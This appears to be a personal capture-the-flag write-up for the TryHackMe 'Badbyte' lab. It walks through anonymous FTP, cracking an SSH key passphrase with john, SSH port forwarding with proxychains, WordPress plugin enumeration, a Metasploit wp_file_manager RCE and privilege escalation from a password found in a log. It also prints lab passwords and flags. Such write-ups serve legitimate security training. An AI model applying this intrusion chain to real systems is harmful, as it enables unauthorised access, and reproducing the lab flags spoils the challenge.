# Badbyte 

> VOiD | Friday 05 November 2021 10:25:02 PM IST

My IP : 10.8.253.221
Target IP : 10.10.145.246



## PORT 30024[ftp]

Anonlogin allowed
```bash
ls                                                                         130 ⨯
hash  id_rsa  note.txt

john hash --wordlist=/usr/share/wordlists/rockyou.txt
cupcake          (id_rsa)

```

## PORT 22 [ssh]
[idrsa:cupcake]
```bash

ssh -i id_rsa errorcauser@10.10.145.246

cat note.txt
Hi Error!
I've set up a webserver locally so no one outside could access it.
It is for testing purposes only.  There are still a few things I need to do like setting up a custom theme.
You can check it out, you already know what to do.
-Cth
:)

```

Port forwarding
```
o complete this task:

    Setup Dynamic Port Forwarding using SSH.
    HINT: -i id_rsa -D 1337
    Set up proxychains for the Dynamic Port Forwarding. Ensure you have commented out socks4 127.0.0.1 9050 in your proxychains configuration and add socks5 127.0.0.1 1337 to the end of configuration file (/etc/proxychains.conf).
    The file name may vary depending on the distro you are using.

    Run a port scan to enumerate internal ports on the server using proxychains. If you use Nmap your command should look like this proxychains nmap -sT 127.0.0.1 .
    After finding the port of the webserver, perform Local Port Forwarding to that port using SSH with the -L flag.
    HINT: -i id_rsa -L 80:127.0.0.1:(remote port) (Try using with sudo)
```

80,3306 listenig

```bash
sudo nmap localhost -p 80 --script http-wordpress-enum --script-args type="plugins",search-limit=1500 -vv 

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
| http-wordpress-enum: 
| Search limited to top 1500 themes/plugins
|   plugins
|     duplicator 1.3.26
|_    wp-file-manager 6.0

msf6 exploit(multi/http/wp_file_manager_rce) 
meterpreter > cat user.txt
THM{227906201d17d9c45aa93d0122ea1af7}


find -user cth 2>/dev/null

/var/log/bash.log


cth@badbyte:~$ G00dP@$sw0rd2020


sudo su
G00dP@$sw0rd2021

cat /root/root.txt
THM{ad485b44f63393b6a9225974909da5fa}

```